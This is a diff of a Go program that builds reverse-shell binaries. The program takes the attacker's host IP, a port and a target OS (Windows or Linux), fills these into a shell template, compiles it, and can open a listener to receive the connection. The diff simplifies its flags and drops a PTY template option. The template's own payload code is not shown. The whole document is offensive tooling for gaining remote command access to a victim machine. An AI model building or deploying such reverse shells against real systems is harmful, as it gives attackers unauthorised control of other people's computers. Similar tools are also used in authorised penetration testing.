@@ -21,37 +21,30 @@ const banner string = `
 `
 
 func main() {
-	host, port, template, listenPort, buildExt := initArgs()
+	host, shellPort, serverOs, listenPort := initArgs()
 	println(banner)
 	if listenPort != "0" {
 		listenTcp(listenPort)
 	} else {
-		buildReverseShell(port, host, template, buildExt)
+		buildReverseShell(host, shellPort, serverOs)
 	}
 }
 
-func initArgs() (string, string, string, string, string) {
+func initArgs() (string, string, string, string) {
 	host := flag.String("i", "localhost", "IP of the host which the reverse shell will connect to.")
-	port := flag.String("p", "1111", "Port of the host which the reverse shell will connect to.")
+	shellPort := flag.String("p", "1111", "Port of the host which the reverse shell will connect to.")
 	serverOs := flag.String("s", "linux", "OS of the server which will start the reverse shell (used to build the right binary) available : \"windows\", \"linux\".")
-	template := flag.String("t", "native", "Template to use to generate the reverse shell. Available : \"native\", \"pty\".")
 	listenPort := flag.String("l", "0", "Port to listen (you can use this argument to bind to your reverse shell).")
 	flag.Parse()
 	if flag.NFlag() == 0 {
-		println("[+] No argument passed. Using default values.")
+		println("[+] No argument passed. Building a reverse shell using default values.")
 	}
-	switch *template {
-	case "pty":
-		*template = "Go-PTY-RevShell.template"
-	default:
-		*template = "Go-RevShell.template"
-	}
-	return *host, *port, *template, *listenPort, *serverOs
+	return *host, *shellPort, *serverOs, *listenPort
 }
 
-func buildReverseShell(port, host, templateFileName, serverOs string) {
+func buildReverseShell(host, port, serverOs string) {
 	println("[+] Compiling reverse shell for " + host + ":" + port + " ...")
-	template, err := ioutil.ReadFile("templates/" + templateFileName)
+	template, err := ioutil.ReadFile("templates/Go-RevShell.template")
 	handleError("Reading template", err)
 	template = bytes.ReplaceAll(template, []byte("template-host"), []byte(host))
 	template = bytes.ReplaceAll(template, []byte("template-port"), []byte(port))
